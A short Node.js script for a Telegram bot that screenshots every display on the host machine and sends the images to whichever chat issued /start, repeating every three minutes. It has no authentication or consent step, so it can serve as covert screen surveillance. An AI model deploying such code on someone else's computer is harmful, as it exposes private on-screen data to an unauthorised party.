const TelegramBot = require('node-telegram-bot-api');

const screenshot = require('screenshot-desktop')

var chatId = 0;
const token = 'api';
const bot = new TelegramBot(token, {polling: true});
var display =[]
var messageList=[]

bot.on("polling_error", console.log);

bot.onText(/\/start/, (msg) => {
    // 'msg' is the received Message from Telegram
    // 'match' is the result of executing the regexp above on the text content
    // of the message
    // console.log(chatId);
    chatId = msg.chat.id;
    const resp = "start"; // the captured "whatever"
  
    // send back the matched "whatever" to the chat
    
    bot.sendMessage(chatId, resp);
    sendScreen()
    
});
bot.onText(/\/stop/, (msg) => {
    // 'msg' is the received Message from Telegram
    // 'match' is the result of executing the regexp above on the text content
    // of the message
    // console.log(chatId);
    chatId = 0;
    const resp = "stop"; // the captured "whatever"
  
    // send back the matched "whatever" to the chat
    
    bot.sendMessage(chatId, resp);
    sendScreen()
});
screenshot.listDisplays().then((displays) => {
    displays.map((e)=>{
        display.push(e.id)
    })
})
function sendScreen(){

    
        display.map((d)=>{
            screenshot({ filename: d,screen:d }).then(async(imgPath) => {
                let rez = await bot.sendPhoto(chatId,imgPath)
                messageList.push(rez.message_id)
            });
        })
           
}

setInterval(()=>{
    if(messageList[11]!=undefined){
        bot.deleteMessage(chatId,messageList[11])
        bot.deleteMessage(chatId,messageList[12])
    }
    if(chatId != 0){
        sendScreen()
    }
},1000*60*3)